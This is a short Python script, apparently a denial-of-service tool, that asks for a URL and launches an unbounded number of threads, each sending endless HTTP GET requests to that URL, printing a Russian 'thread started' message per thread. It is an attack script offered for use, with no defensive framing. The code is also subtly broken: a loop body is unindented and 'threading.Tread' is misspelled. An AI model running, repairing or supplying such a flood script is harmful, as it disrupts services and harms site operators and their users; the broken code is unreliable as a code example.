import requests
import threading

url = input("URL: ")

def dos():
  while True:
  requests.get(url)
 
i = 0
while True:
  thr = threading.Tread(target=dos)
  thr.start()
  i += 1
  print(i, "Поток запущен!")
